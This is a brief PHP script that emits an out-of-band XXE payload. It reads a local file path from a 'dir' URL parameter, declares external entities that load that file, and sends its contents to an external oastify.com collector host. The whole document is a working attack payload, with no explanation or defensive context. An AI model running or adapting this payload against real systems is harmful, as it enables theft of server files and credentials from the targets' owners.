<?php
$dir = $_GET['dir'];
?>

<!ENTITY % file SYSTEM "file:///<?php echo $dir;?>">
<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM '87dpkg4u5be5xksd03i2g4pt9kfb33rs.oastify.com/?xxe=%file;'>">
%ext;
%exfil;
